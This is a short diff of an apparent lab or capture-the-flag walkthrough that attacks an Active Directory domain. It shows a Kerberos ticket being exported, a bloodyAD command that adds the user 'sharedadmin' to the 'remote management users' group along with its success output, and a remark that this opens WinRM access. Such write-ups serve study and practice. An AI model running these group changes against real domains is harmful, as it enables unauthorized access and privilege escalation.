@@ -661,9 +661,15 @@ Since im using kerberos becuase of the limitations of the protected users ill st
 export KRB5CCNAME=sharedadmin.ccache
 ```
 
+Now its exported i can add this user to the required groups
+
 ```python
 bloodyAD --host dc01.fragments.local -d fragments.local -k add groupMember 'remote management users' 'sharedadmin' 
 [+] sharedadmin added to remote management users
 ```
 
+First ive added them to remote management so i can winrm
 
+```python
+
+```
